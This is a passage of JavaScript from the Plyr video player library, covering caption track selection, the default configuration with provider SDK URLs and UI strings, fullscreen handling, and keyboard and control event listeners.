            n = he.getTracks.call(this);
          if (-1 !== e)
            if (m.number(e))
              if (e in n) {
                if (this.captions.currentTrack !== e) {
                  this.captions.currentTrack = e;
                  var i = n[e],
                    a = (i || {}).language;
                  (this.captions.currentTrackNode = i),
                    ce.updateSetting.call(this, "captions"),
                    t ||
                      ((this.captions.language = a),
                      this.storage.set({ language: a })),
                    this.isVimeo && this.embed.enableTextTrack(a),
                    k.call(this, this.media, "languagechange");
                }
                he.toggle.call(this, !0, t),
                  this.isHTML5 && this.isVideo && he.updateCues.call(this);
              } else this.debug.warn("Track not found", e);
            else this.debug.warn("Invalid caption argument", e);
          else he.toggle.call(this, !1, t);
        },
        setLanguage: function (e) {
          var t =
            !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
          if (m.string(e)) {
            var n = e.toLowerCase();
            this.captions.language = n;
            var i = he.getTracks.call(this),
              a = he.findTrack.call(this, [n]);
            he.set.call(this, i.indexOf(a), t);
          } else this.debug.warn("Invalid language argument", e);
        },
        getTracks: function () {
          var e = this,
            t = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
          return Array.from((this.media || {}).textTracks || [])
            .filter(function (n) {
              return !e.isHTML5 || t || e.captions.meta.has(n);
            })
            .filter(function (e) {
              return ["captions", "subtitles"].includes(e.kind);
            });
        },
        findTrack: function (e) {
          var t,
            n = this,
            i = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
            a = he.getTracks.call(this),
            s = function (e) {
              return Number((n.captions.meta.get(e) || {}).default);
            },
            o = Array.from(a).sort(function (e, t) {
              return s(t) - s(e);
            });
          return (
            e.every(function (e) {
              return !(t = o.find(function (t) {
                return t.language === e;
              }));
            }),
            t || (i ? o[0] : void 0)
          );
        },
        getCurrentTrack: function () {
          return he.getTracks.call(this)[this.currentTrack];
        },
        getLabel: function (e) {
          var t = e;
          return (
            !m.track(t) &&
              W.textTracks &&
              this.captions.toggled &&
              (t = he.getCurrentTrack.call(this)),
            m.track(t)
              ? m.empty(t.label)
                ? m.empty(t.language)
                  ? te("enabled", this.config)
                  : e.language.toUpperCase()
                : t.label
              : te("disabled", this.config)
          );
        },
        updateCues: function (e) {
          if (this.supported.ui)
            if (m.element(this.elements.captions))
              if (m.nullOrUndefined(e) || Array.isArray(e)) {
                var t = e;
                if (!t) {
                  var n = he.getCurrentTrack.call(this);
                  t = Array.from((n || {}).activeCues || [])
                    .map(function (e) {
                      return e.getCueAsHTML();
                    })
                    .map(Z);
                }
                var i = t
                  .map(function (e) {
                    return e.trim();
                  })
                  .join("\n");
                if (i !== this.elements.captions.innerHTML) {
                  C(this.elements.captions);
                  var a = A("span", M(this.config.selectors.caption));
                  (a.innerHTML = i),
                    this.elements.captions.appendChild(a),
                    k.call(this, this.media, "cuechange");
                }
              } else this.debug.warn("updateCues: Invalid input", e);
            else this.debug.warn("No captions element to render to");
        },
      },
      pe = {
        enabled: !0,
        title: "",
        debug: !1,
        autoplay: !1,
        autopause: !0,
        playsinline: !0,
        seekTime: 10,
        volume: 1,
        muted: !1,
        duration: null,
        displayDuration: !0,
        invertTime: !0,
        toggleInvert: !0,
        ratio: "16:9",
        clickToPlay: !0,
        hideControls: !0,
        resetOnEnd: !1,
        disableContextMenu: !0,
        loadSprite: !0,
        iconPrefix: "plyr",
        iconUrl: (typeof myScriptData !== 'undefined' && myScriptData.plyrSvg) ? myScriptData.plyrSvg : '',
        blankVideo: (typeof myScriptData !== 'undefined' && myScriptData.plyrBlankVideo) ? myScriptData.plyrBlankVideo : '',
        quality: {
          default: 576,
          options: [4320, 2880, 2160, 1440, 1080, 720, 576, 480, 360, 240],
        },
        loop: { active: !1 },
        speed: { selected: 1, options: [0.5, 0.75, 1, 1.25, 1.5, 1.75, 2] },
        keyboard: { focused: !0, global: !1 },
        tooltips: { controls: !1, seek: !0 },
        captions: { active: !1, language: "auto", update: !1 },
        fullscreen: { enabled: !0, fallback: !0, iosNative: !1 },
        storage: { enabled: !0, key: "plyr" },
        controls: [
          "play-large",
          "play",
          "progress",
          "current-time",
          "mute",
          "volume",
          "captions",
          "settings",
          "pip",
          "airplay",
          "fullscreen",
        ],
        settings: ["captions", "quality", "speed"],
        i18n: {
          restart: "Restart",
          rewind: "Rewind {seektime}s",
          play: "Play",
          pause: "Pause",
          fastForward: "Forward {seektime}s",
          seek: "Seek",
          seekLabel: "{currentTime} of {duration}",
          played: "Played",
          buffered: "Buffered",
          currentTime: "Current time",
          duration: "Duration",
          volume: "Volume",
          mute: "Mute",
          unmute: "Unmute",
          enableCaptions: "Enable captions",
          disableCaptions: "Disable captions",
          download: "Download",
          enterFullscreen: "Enter fullscreen",
          exitFullscreen: "Exit fullscreen",
          frameTitle: "Player for {title}",
          captions: "Captions",
          settings: "Settings",
          menuBack: "Go back to previous menu",
          speed: "Speed",
          normal: "Normal",
          quality: "Quality",
          loop: "Loop",
          start: "Start",
          end: "End",
          all: "All",
          reset: "Reset",
          disabled: "Disabled",
          enabled: "Enabled",
          advertisement: "Ad",
          qualityBadge: {
            2160: "4K",
            1440: "HD",
            1080: "HD",
            720: "HD",
            576: "SD",
            480: "SD",
          },
        },
        urls: {
          download: null,
          vimeo: {
            sdk: "https://player.vimeo.com/api/player.js",
            iframe: "https://player.vimeo.com/video/{0}?{1}",
            api: "https://vimeo.com/api/v2/video/{0}.json",
          },
          youtube: {
            sdk: "https://www.youtube.com/iframe_api",
            api: "https://www.googleapis.com/youtube/v3/videos?id={0}&key={1}&fields=items(snippet(title))&part=snippet",
          },
          googleIMA: {
            sdk: "https://imasdk.googleapis.com/js/sdkloader/ima3.js",
          },
        },
        listeners: {
          seek: null,
          play: null,
          pause: null,
          restart: null,
          rewind: null,
          fastForward: null,
          mute: null,
          volume: null,
          captions: null,
          download: null,
          fullscreen: null,
          pip: null,
          airplay: null,
          speed: null,
          quality: null,
          loop: null,
          language: null,
        },
        events: [
          "ended",
          "progress",
          "stalled",
          "playing",
          "waiting",
          "canplay",
          "canplaythrough",
          "loadstart",
          "loadeddata",
          "loadedmetadata",
          "timeupdate",
          "volumechange",
          "play",
          "pause",
          "error",
          "seeking",
          "seeked",
          "emptied",
          "ratechange",
          "cuechange",
          "download",
          "enterfullscreen",
          "exitfullscreen",
          "captionsenabled",
          "captionsdisabled",
          "languagechange",
          "controlshidden",
          "controlsshown",
          "ready",
          "statechange",
          "qualitychange",
          "adsloaded",
          "adscontentpause",
          "adscontentresume",
          "adstarted",
          "adsmidpoint",
          "adscomplete",
          "adsallcomplete",
          "adsimpression",
          "adsclick",
        ],
        selectors: {
          editable: "input, textarea, select, [contenteditable]",
          container: ".plyr",
          controls: { container: null, wrapper: ".plyr__controls" },
          labels: "[data-plyr]",
          buttons: {
            play: '[data-plyr="play"]',
            pause: '[data-plyr="pause"]',
            restart: '[data-plyr="restart"]',
            rewind: '[data-plyr="rewind"]',
            fastForward: '[data-plyr="fast-forward"]',
            mute: '[data-plyr="mute"]',
            captions: '[data-plyr="captions"]',
            download: '[data-plyr="download"]',
            fullscreen: '[data-plyr="fullscreen"]',
            pip: '[data-plyr="pip"]',
            airplay: '[data-plyr="airplay"]',
            settings: '[data-plyr="settings"]',
            loop: '[data-plyr="loop"]',
          },
          inputs: {
            seek: '[data-plyr="seek"]',
            volume: '[data-plyr="volume"]',
            speed: '[data-plyr="speed"]',
            language: '[data-plyr="language"]',
            quality: '[data-plyr="quality"]',
          },
          display: {
            currentTime: ".plyr__time--current",
            duration: ".plyr__time--duration",
            buffer: ".plyr__progress__buffer",
            loop: ".plyr__progress__loop",
            volume: ".plyr__volume--display",
          },
          progress: ".plyr__progress",
          captions: ".plyr__captions",
          caption: ".plyr__caption",
          menu: { quality: ".js-plyr__menu__list--quality" },
        },
        classNames: {
          type: "plyr--{0}",
          provider: "plyr--{0}",
          video: "plyr__video-wrapper",
          embed: "plyr__video-embed",
          embedContainer: "plyr__video-embed__container",
          poster: "plyr__poster",
          posterEnabled: "plyr__poster-enabled",
          ads: "plyr__ads",
          control: "plyr__control",
          controlPressed: "plyr__control--pressed",
          playing: "plyr--playing",
          paused: "plyr--paused",
          stopped: "plyr--stopped",
          loading: "plyr--loading",
          hover: "plyr--hover",
          tooltip: "plyr__tooltip",
          cues: "plyr__cues",
          hidden: "plyr__sr-only",
          hideControls: "plyr--hide-controls",
          isIos: "plyr--is-ios",
          isTouch: "plyr--is-touch",
          uiSupported: "plyr--full-ui",
          noTransition: "plyr--no-transition",
          display: { time: "plyr__time" },
          menu: {
            value: "plyr__menu__value",
            badge: "plyr__badge",
            open: "plyr--menu-open",
          },
          captions: {
            enabled: "plyr--captions-enabled",
            active: "plyr--captions-active",
          },
          fullscreen: {
            enabled: "plyr--fullscreen-enabled",
            fallback: "plyr--fullscreen-fallback",
          },
          pip: { supported: "plyr--pip-supported", active: "plyr--pip-active" },
          airplay: {
            supported: "plyr--airplay-supported",
            active: "plyr--airplay-active",
          },
          tabFocus: "plyr__tab-focus",
        },
        attributes: {
          embed: { provider: "data-plyr-provider", id: "data-plyr-embed-id" },
        },
        keys: { google: null },
        ads: { enabled: !1, publisherId: "" },
      },
      me = "picture-in-picture",
      fe = "inline",
      ge = { html5: "html5", youtube: "youtube", vimeo: "vimeo" },
      ye = { audio: "audio", video: "video" };
    var ve = function () {},
      be = (function () {
        function t() {
          var n =
            arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
          e(this, t),
            (this.enabled = window.console && n),
            this.enabled && this.log("Debugging enabled");
        }
        return (
          n(t, [
            {
              key: "log",
              get: function () {
                return this.enabled
                  ? Function.prototype.bind.call(console.log, console)
                  : ve;
              },
            },
            {
              key: "warn",
              get: function () {
                return this.enabled
                  ? Function.prototype.bind.call(console.warn, console)
                  : ve;
              },
            },
            {
              key: "error",
              get: function () {
                return this.enabled
                  ? Function.prototype.bind.call(console.error, console)
                  : ve;
              },
            },
          ]),
          t
        );
      })();
    function ke() {
      if (this.enabled) {
        var e = this.player.elements.buttons.fullscreen;
        m.element(e) && (e.pressed = this.active),
          k.call(
            this.player,
            this.target,
            this.active ? "enterfullscreen" : "exitfullscreen",
            !0
          ),
          F.isIos ||
            function () {
              var e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : null,
                t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1];
              if (m.element(e)) {
                var n = _.call(
                    this,
                    "button:not(:disabled), input:not(:disabled), [tabindex]"
                  ),
                  i = n[0],
                  a = n[n.length - 1];
                g.call(
                  this,
                  this.elements.container,
                  "keydown",
                  function (e) {
                    if ("Tab" === e.key && 9 === e.keyCode) {
                      var t = document.activeElement;
                      t !== a || e.shiftKey
                        ? t === i &&
                          e.shiftKey &&
                          (a.focus(), e.preventDefault())
                        : (i.focus(), e.preventDefault());
                    }
                  },
                  t,
                  !1
                );
              }
            }.call(this.player, this.target, this.active);
      }
    }
    function we() {
      var e = this,
        t = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
      if (
        (t
          ? (this.scrollPosition = {
              x: window.scrollX || 0,
              y: window.scrollY || 0,
            })
          : window.scrollTo(this.scrollPosition.x, this.scrollPosition.y),
        (document.body.style.overflow = t ? "hidden" : ""),
        L(this.target, this.player.config.classNames.fullscreen.fallback, t),
        F.isIos)
      ) {
        var n = document.head.querySelector('meta[name="viewport"]'),
          i = "viewport-fit=cover";
        n ||
          (n = document.createElement("meta")).setAttribute("name", "viewport");
        var a = m.string(n.content) && n.content.includes(i);
        t
          ? ((this.cleanupViewport = !a), a || (n.content += ",".concat(i)))
          : this.cleanupViewport &&
            (n.content = n.content
              .split(",")
              .filter(function (e) {
                return e.trim() !== i;
              })
              .join(",")),
          setTimeout(function () {
            return H(e.target);
          }, 100);
      }
      ke.call(this);
    }
    var Te = (function () {
      function t(n) {
        var i = this;
        e(this, t),
          (this.player = n),
          (this.prefix = t.prefix),
          (this.property = t.property),
          (this.scrollPosition = { x: 0, y: 0 }),
          y.call(
            this.player,
            document,
            "ms" === this.prefix
              ? "MSFullscreenChange"
              : "".concat(this.prefix, "fullscreenchange"),
            function () {
              ke.call(i);
            }
          ),
          y.call(
            this.player,
            this.player.elements.container,
            "dblclick",
            function (e) {
              (m.element(i.player.elements.controls) &&
                i.player.elements.controls.contains(e.target)) ||
                i.toggle();
            }
          ),
          this.update();
      }
      return (
        n(
          t,
          [
            {
              key: "update",
              value: function () {
                this.enabled
                  ? this.player.debug.log(
                      "".concat(
                        t.native ? "Native" : "Fallback",
                        " fullscreen enabled"
                      )
                    )
                  : this.player.debug.log(
                      "Fullscreen not supported and fallback disabled"
                    ),
                  L(
                    this.player.elements.container,
                    this.player.config.classNames.fullscreen.enabled,
                    this.enabled
                  );
              },
            },
            {
              key: "enter",
              value: function () {
                this.enabled &&
                  (F.isIos && this.player.config.fullscreen.iosNative
                    ? this.target.webkitEnterFullscreen()
                    : t.native
                    ? this.prefix
                      ? m.empty(this.prefix) ||
                        this.target[
                          ""
                            .concat(this.prefix, "Request")
                            .concat(this.property)
                        ]()
                      : this.target.requestFullscreen()
                    : we.call(this, !0));
              },
            },
            {
              key: "exit",
              value: function () {
                if (this.enabled)
                  if (F.isIos && this.player.config.fullscreen.iosNative)
                    this.target.webkitExitFullscreen(), this.player.play();
                  else if (t.native)
                    if (this.prefix) {
                      if (!m.empty(this.prefix)) {
                        var e = "moz" === this.prefix ? "Cancel" : "Exit";
                        document[
                          "".concat(this.prefix).concat(e).concat(this.property)
                        ]();
                      }
                    } else
                      (
                        document.cancelFullScreen || document.exitFullscreen
                      ).call(document);
                  else we.call(this, !1);
              },
            },
            {
              key: "toggle",
              value: function () {
                this.active ? this.exit() : this.enter();
              },
            },
            {
              key: "enabled",
              get: function () {
                return (
                  (t.native || this.player.config.fullscreen.fallback) &&
                  this.player.config.fullscreen.enabled &&
                  this.player.supported.ui &&
                  this.player.isVideo
                );
              },
            },
            {
              key: "active",
              get: function () {
                return (
                  !!this.enabled &&
                  (t.native
                    ? (this.prefix
                        ? document[
                            ""
                              .concat(this.prefix)
                              .concat(this.property, "Element")
                          ]
                        : document.fullscreenElement) === this.target
                    : x(
                        this.target,
                        this.player.config.classNames.fullscreen.fallback
                      ))
                );
              },
            },
            {
              key: "target",
              get: function () {
                return F.isIos && this.player.config.fullscreen.iosNative
                  ? this.player.media
                  : this.player.elements.container;
              },
            },
          ],
          [
            {
              key: "native",
              get: function () {
                return !!(
                  document.fullscreenEnabled ||
                  document.webkitFullscreenEnabled ||
                  document.mozFullScreenEnabled ||
                  document.msFullscreenEnabled
                );
              },
            },
            {
              key: "prefix",
              get: function () {
                if (m.function(document.exitFullscreen)) return "";
                var e = "";
                return (
                  ["webkit", "moz", "ms"].some(function (t) {
                    return (
                      !(
                        !m.function(document["".concat(t, "ExitFullscreen")]) &&
                        !m.function(document["".concat(t, "CancelFullScreen")])
                      ) && ((e = t), !0)
                    );
                  }),
                  e
                );
              },
            },
            {
              key: "property",
              get: function () {
                return "moz" === this.prefix ? "FullScreen" : "Fullscreen";
              },
            },
          ]
        ),
        t
      );
    })();
    function Ae(e) {
      var t =
        arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1;
      return new Promise(function (n, i) {
        var a = new Image(),
          s = function () {
            delete a.onload, delete a.onerror, (a.naturalWidth >= t ? n : i)(a);
          };
        Object.assign(a, { onload: s, onerror: s, src: e });
      });
    }
    var Ee = {
        addStyleHook: function () {
          L(
            this.elements.container,
            this.config.selectors.container.replace(".", ""),
            !0
          ),
            L(
              this.elements.container,
              this.config.classNames.uiSupported,
              this.supported.ui
            );
        },
        toggleNativeControls: function () {
          arguments.length > 0 &&
          void 0 !== arguments[0] &&
          arguments[0] &&
          this.isHTML5
            ? this.media.setAttribute("controls", "")
            : this.media.removeAttribute("controls");
        },
        build: function () {
          var e = this;
          if ((this.listeners.media(), !this.supported.ui))
            return (
              this.debug.warn(
                "Basic support only for "
                  .concat(this.provider, " ")
                  .concat(this.type)
              ),
              void Ee.toggleNativeControls.call(this, !0)
            );
          m.element(this.elements.controls) ||
            (ce.inject.call(this), this.listeners.controls()),
            Ee.toggleNativeControls.call(this),
            this.isHTML5 && he.setup.call(this),
            (this.volume = null),
            (this.muted = null),
            (this.speed = null),
            (this.loop = null),
            (this.quality = null),
            ce.updateVolume.call(this),
            ce.timeUpdate.call(this),
            Ee.checkPlaying.call(this),
            L(
              this.elements.container,
              this.config.classNames.pip.supported,
              W.pip && this.isHTML5 && this.isVideo
            ),
            L(
              this.elements.container,
              this.config.classNames.airplay.supported,
              W.airplay && this.isHTML5
            ),
            L(this.elements.container, this.config.classNames.isIos, F.isIos),
            L(
              this.elements.container,
              this.config.classNames.isTouch,
              this.touch
            ),
            (this.ready = !0),
            setTimeout(function () {
              k.call(e, e.media, "ready");
            }, 0),
            Ee.setTitle.call(this),
            this.poster &&
              Ee.setPoster.call(this, this.poster, !1).catch(function () {}),
            this.config.duration && ce.durationUpdate.call(this);
        },
        setTitle: function () {
          var e = te("play", this.config);
          if (
            (m.string(this.config.title) &&
              !m.empty(this.config.title) &&
              (e += ", ".concat(this.config.title)),
            Array.from(this.elements.buttons.play || []).forEach(function (t) {
              t.setAttribute("aria-label", e);
            }),
            this.isEmbed)
          ) {
            var t = j.call(this, "iframe");
            if (!m.element(t)) return;
            var n = m.empty(this.config.title) ? "video" : this.config.title,
              i = te("frameTitle", this.config);
            t.setAttribute("title", i.replace("{title}", n));
          }
        },
        togglePoster: function (e) {
          L(this.elements.container, this.config.classNames.posterEnabled, e);
        },
        setPoster: function (e) {
          var t = this;
          return (arguments.length > 1 &&
            void 0 !== arguments[1] &&
            !arguments[1]) ||
            !this.poster
            ? (this.media.setAttribute("poster", e),
              function () {
                var e = this;
                return new Promise(function (t) {
                  return e.ready
                    ? setTimeout(t, 0)
                    : y.call(e, e.elements.container, "ready", t);
                }).then(function () {});
              }
                .call(this)
                .then(function () {
                  return Ae(e);
                })
                .catch(function (n) {
                  throw (e === t.poster && Ee.togglePoster.call(t, !1), n);
                })
                .then(function () {
                  if (e !== t.poster)
                    throw new Error(
                      "setPoster cancelled by later call to setPoster"
                    );
                })
                .then(function () {
                  return (
                    Object.assign(t.elements.poster.style, {
                      backgroundImage: "url('".concat(e, "')"),
                      backgroundSize: "",
                    }),
                    Ee.togglePoster.call(t, !0),
                    e
                  );
                }))
            : Promise.reject(new Error("Poster already set"));
        },
        checkPlaying: function (e) {
          var t = this;
          L(
            this.elements.container,
            this.config.classNames.playing,
            this.playing
          ),
            L(
              this.elements.container,
              this.config.classNames.paused,
              this.paused
            ),
            L(
              this.elements.container,
              this.config.classNames.stopped,
              this.stopped
            ),
            Array.from(this.elements.buttons.play || []).forEach(function (e) {
              e.pressed = t.playing;
            }),
            (m.event(e) && "timeupdate" === e.type) ||
              Ee.toggleControls.call(this);
        },
        checkLoading: function (e) {
          var t = this;
          (this.loading = ["stalled", "waiting"].includes(e.type)),
            clearTimeout(this.timers.loading),
            (this.timers.loading = setTimeout(
              function () {
                L(t.elements.container, t.config.classNames.loading, t.loading),
                  Ee.toggleControls.call(t);
              },
              this.loading ? 250 : 0
            ));
        },
        toggleControls: function (e) {
          var t = this.elements.controls;
          if (t && this.config.hideControls) {
            var n = this.touch && this.lastSeekTime + 2e3 > Date.now();
            this.toggleControls(
              Boolean(
                e || this.loading || this.paused || t.pressed || t.hover || n
              )
            );
          }
        },
      },
      Pe = (function () {
        function t(n) {
          e(this, t),
            (this.player = n),
            (this.lastKey = null),
            (this.focusTimer = null),
            (this.lastKeyDown = null),
            (this.handleKey = this.handleKey.bind(this)),
            (this.toggleMenu = this.toggleMenu.bind(this)),
            (this.setTabFocus = this.setTabFocus.bind(this)),
            (this.firstTouch = this.firstTouch.bind(this));
        }
        return (
          n(t, [
            {
              key: "handleKey",
              value: function (e) {
                var t = this.player,
                  n = t.elements,
                  i = e.keyCode ? e.keyCode : e.which,
                  a = "keydown" === e.type,
                  s = a && i === this.lastKey;
                if (
                  !(e.altKey || e.ctrlKey || e.metaKey || e.shiftKey) &&
                  m.number(i)
                ) {
                  if (a) {
                    var o = document.activeElement;
                    if (m.element(o)) {
                      var r = t.config.selectors.editable;
                      if (o !== n.inputs.seek && I(o, r)) return;
                      if (32 === e.which && I(o, 'button, [role^="menuitem"]'))
                        return;
                    }
                    switch (
                      ([
                        32, 37, 38, 39, 40, 48, 49, 50, 51, 52, 53, 54, 56, 57,
                        67, 70, 73, 75, 76, 77, 79,
                      ].includes(i) &&
                        (e.preventDefault(), e.stopPropagation()),
                      i)
                    ) {
                      case 48:
                      case 49:
                      case 50:
                      case 51:
                      case 52:
                      case 53:
                      case 54:
                      case 55:
                      case 56:
                      case 57:
                        s || (t.currentTime = (t.duration / 10) * (i - 48));
                        break;
                      case 32:
                      case 75:
                        s || t.togglePlay();
                        break;
                      case 38:
                        t.increaseVolume(0.1);
                        break;
                      case 40:
                        t.decreaseVolume(0.1);
                        break;
                      case 77:
                        s || (t.muted = !t.muted);
                        break;
                      case 39:
                        t.forward();
                        break;
                      case 37:
                        t.rewind();
                        break;
                      case 70:
                        t.fullscreen.toggle();
                        break;
                      case 67:
                        s || t.toggleCaptions();
                        break;
                      case 76:
                        t.loop = !t.loop;
                    }
                    !t.fullscreen.enabled &&
                      t.fullscreen.active &&
                      27 === i &&
                      t.fullscreen.toggle(),
                      (this.lastKey = i);
                  } else this.lastKey = null;
                }
              },
            },
            {
              key: "toggleMenu",
              value: function (e) {
                ce.toggleMenu.call(this.player, e);
              },
            },
            {
              key: "firstTouch",
              value: function () {
                var e = this.player,
                  t = e.elements;
                (e.touch = !0), L(t.container, e.config.classNames.isTouch, !0);
              },
            },
            {
              key: "setTabFocus",
              value: function (e) {
                var t = this.player,
                  n = t.elements;
                if (
                  (clearTimeout(this.focusTimer),
                  "keydown" !== e.type || 9 === e.which)
                ) {
                  "keydown" === e.type && (this.lastKeyDown = e.timeStamp);
                  var i,
                    a = e.timeStamp - this.lastKeyDown <= 20;
                  if ("focus" !== e.type || a)
                    (i = t.config.classNames.tabFocus),
                      L(_.call(t, ".".concat(i)), i, !1),
                      (this.focusTimer = setTimeout(function () {
                        var e = document.activeElement;
                        n.container.contains(e) &&
                          L(
                            document.activeElement,
                            t.config.classNames.tabFocus,
                            !0
                          );
                      }, 10));
                }
              },
            },
            {
              key: "global",
              value: function () {
                var e =
                    !(arguments.length > 0 && void 0 !== arguments[0]) ||
                    arguments[0],
                  t = this.player;
                t.config.keyboard.global &&
                  g.call(t, window, "keydown keyup", this.handleKey, e, !1),
                  g.call(t, document.body, "click", this.toggleMenu, e),
                  b.call(t, document.body, "touchstart", this.firstTouch),
                  g.call(
                    t,
                    document.body,
                    "keydown focus blur",
                    this.setTabFocus,
                    e,
                    !1,
                    !0
                  );
              },
            },
            {
              key: "container",
              value: function () {
                var e = this.player,
                  t = e.elements;
                !e.config.keyboard.global &&
                  e.config.keyboard.focused &&
                  y.call(e, t.container, "keydown keyup", this.handleKey, !1),
                  y.call(
                    e,
                    t.container,
                    "mousemove mouseleave touchstart touchmove enterfullscreen exitfullscreen",
                    function (n) {
                      var i = t.controls;
                      i &&
                        "enterfullscreen" === n.type &&
                        ((i.pressed = !1), (i.hover = !1));
                      var a = 0;
                      ["touchstart", "touchmove", "mousemove"].includes(
                        n.type
                      ) &&
                        (Ee.toggleControls.call(e, !0),
                        (a = e.touch ? 3e3 : 2e3)),
                        clearTimeout(e.timers.controls),
                        (e.timers.controls = setTimeout(function () {
                          return Ee.toggleControls.call(e, !1);
                        }, a));
                    }
                  );
              },
            },
            {
              key: "media",
              value: function () {
                var e = this.player,
                  t = e.elements;
                if (
                  (y.call(
                    e,
                    e.media,
                    "timeupdate seeking seeked",
                    function (t) {
                      return ce.timeUpdate.call(e, t);
                    }
                  ),
                  y.call(
                    e,
                    e.media,
                    "durationchange loadeddata loadedmetadata",
                    function (t) {
                      return ce.durationUpdate.call(e, t);
                    }
                  ),
                  y.call(e, e.media, "canplay loadeddata", function () {
                    N(t.volume, !e.hasAudio), N(t.buttons.mute, !e.hasAudio);
                  }),
                  y.call(e, e.media, "ended", function () {
                    e.isHTML5 &&
                      e.isVideo &&
                      e.config.resetOnEnd &&
                      e.restart();
                  }),
                  y.call(
                    e,
                    e.media,
                    "progress playing seeking seeked",
                    function (t) {
                      return ce.updateProgress.call(e, t);
                    }
                  ),
                  y.call(e, e.media, "volumechange", function (t) {
                    return ce.updateVolume.call(e, t);
                  }),
                  y.call(
                    e,
                    e.media,
                    "playing play pause ended emptied timeupdate",
                    function (t) {
                      return Ee.checkPlaying.call(e, t);
                    }
                  ),
                  y.call(
                    e,
                    e.media,
                    "waiting canplay seeked playing",
                    function (t) {
                      return Ee.checkLoading.call(e, t);
                    }
                  ),
                  y.call(e, e.media, "playing", function () {
                    e.ads &&
                      e.ads.enabled &&
                      !e.ads.initialized &&
                      e.ads.managerPromise
                        .then(function () {
                          return e.ads.play();
                        })
                        .catch(function () {
                          return e.play();
                        });
                  }),
                  e.supported.ui && e.config.clickToPlay && !e.isAudio)
                ) {
                  var n = j.call(e, ".".concat(e.config.classNames.video));
                  if (!m.element(n)) return;
                  y.call(e, t.container, "click", function (i) {
                    ([t.container, n].includes(i.target) ||
                      n.contains(i.target)) &&
                      ((e.touch && e.config.hideControls) ||
                        (e.ended ? (e.restart(), e.play()) : e.togglePlay()));
                  });
                }
                e.supported.ui &&
                  e.config.disableContextMenu &&
                  y.call(
                    e,
                    t.wrapper,
                    "contextmenu",
                    function (e) {
                      e.preventDefault();
                    },
                    !1
                  ),
                  y.call(e, e.media, "volumechange", function () {
                    e.storage.set({ volume: e.volume, muted: e.muted });
                  }),
                  y.call(e, e.media, "ratechange", function () {
                    ce.updateSetting.call(e, "speed"),
                      e.storage.set({ speed: e.speed });
                  }),
                  y.call(e, e.media, "qualitychange", function (t) {
                    ce.updateSetting.call(e, "quality", null, t.detail.quality);
                  }),
                  y.call(e, e.media, "ready qualitychange", function () {
                    ce.setDownloadLink.call(e);
                  });
                var i = e.config.events.concat(["keyup", "keydown"]).join(" ");
                y.call(e, e.media, i, function (n) {
                  var i = n.detail,
                    a = void 0 === i ? {} : i;
                  "error" === n.type && (a = e.media.error),
                    k.call(e, t.container, n.type, !0, a);
                });
              },
            },
            {
              key: "proxy",
              value: function (e, t, n) {
                var i = this.player,
                  a = i.config.listeners[n],
                  s = !0;
                m.function(a) && (s = a.call(i, e)),
                  s && m.function(t) && t.call(i, e);
              },
            },
            {
              key: "bind",
              value: function (e, t, n, i) {
                var a = this,
                  s =
                    !(arguments.length > 4 && void 0 !== arguments[4]) ||
                    arguments[4],
                  o = this.player,
                  r = o.config.listeners[i],
                  l = m.function(r);
                y.call(
                  o,
                  e,
                  t,
                  function (e) {
                    return a.proxy(e, n, i);
                  },
                  s && !l
                );
              },
            },
            {
              key: "controls",
              value: function () {
                var e = this,
                  t = this.player,
                  n = t.elements,
                  i = F.isIE ? "change" : "input";
                if (
                  (n.buttons.play &&
                    Array.from(n.buttons.play).forEach(function (n) {
                      e.bind(n, "click", t.togglePlay, "play");
                    }),
                  this.bind(n.buttons.restart, "click", t.restart, "restart"),
                  this.bind(n.buttons.rewind, "click", t.rewind, "rewind"),
                  this.bind(
                    n.buttons.fastForward,
                    "click",
                    t.forward,
                    "fastForward"
                  ),
                  this.bind(
                    n.buttons.mute,
                    "click",
                    function () {
                      t.muted = !t.muted;
                    },
                    "mute"
                  ),
                  this.bind(n.buttons.captions, "click", function () {
                    return t.toggleCaptions();
                  }),
                  this.bind(
                    n.buttons.download,
                    "click",
                    function () {
                      k.call(t, t.media, "download");
                    },
                    "download"
                  ),
                  this.bind(
                    n.buttons.fullscreen,
                    "click",
                    function () {
                      t.fullscreen.toggle();
                    },
                    "fullscreen"
                  ),
                  this.bind(
                    n.buttons.pip,
                    "click",
                    function () {
                      t.pip = "toggle";
                    },
                    "pip"
                  ),
                  this.bind(n.buttons.airplay, "click", t.airplay, "airplay"),
                  this.bind(n.buttons.settings, "click", function (e) {
                    e.stopPropagation(), ce.toggleMenu.call(t, e);
                  }),
                  this.bind(
                    n.buttons.settings,
                    "keyup",
                    function (e) {
                      var n = e.which;
                      [13, 32].includes(n) &&
                        (13 !== n
                          ? (e.preventDefault(),
                            e.stopPropagation(),
                            ce.toggleMenu.call(t, e))
                          : ce.focusFirstMenuItem.call(t, null, !0));
                    },
                    null,
                    !1
                  ),
                  this.bind(n.settings.menu, "keydown", function (e) {
                    27 === e.which && ce.toggleMenu.call(t, e);
                  }),
                  this.bind(n.inputs.seek, "mousedown mousemove", function (e) {
                    var t = n.progress.getBoundingClientRect(),
                      i = (100 / t.width) * (e.pageX - t.left);
                    e.currentTarget.setAttribute("seek-value", i);
                  }),
                  this.bind(
                    n.inputs.seek,
                    "mousedown mouseup keydown keyup touchstart touchend",
                    function (e) {
                      var n = e.currentTarget,
                        i = e.keyCode ? e.keyCode : e.which;
                      if (!m.keyboardEvent(e) || 39 === i || 37 === i) {
                        t.lastSeekTime = Date.now();
                        var a = n.hasAttribute("play-on-seeked"),
                          s = ["mouseup", "touchend", "keyup"].includes(e.type);
                        a && s
                          ? (n.removeAttribute("play-on-seeked"), t.play())
                          : !s &&
                            t.playing &&
                            (n.setAttribute("play-on-seeked", ""), t.pause());
                      }
                    }
                  ),
                  F.isIos)
                ) {
                  var s = _.call(t, 'input[type="range"]');
                  Array.from(s).forEach(function (t) {
                    return e.bind(t, i, function (e) {
                      return H(e.target);
                    });
                  });
                }
                this.bind(
                  n.inputs.seek,
                  i,
                  function (e) {
                    var n = e.currentTarget,
                      i = n.getAttribute("seek-value");
                    m.empty(i) && (i = n.value),
                      n.removeAttribute("seek-value"),
                      (t.currentTime = (i / n.max) * t.duration);
                  },
                  "seek"
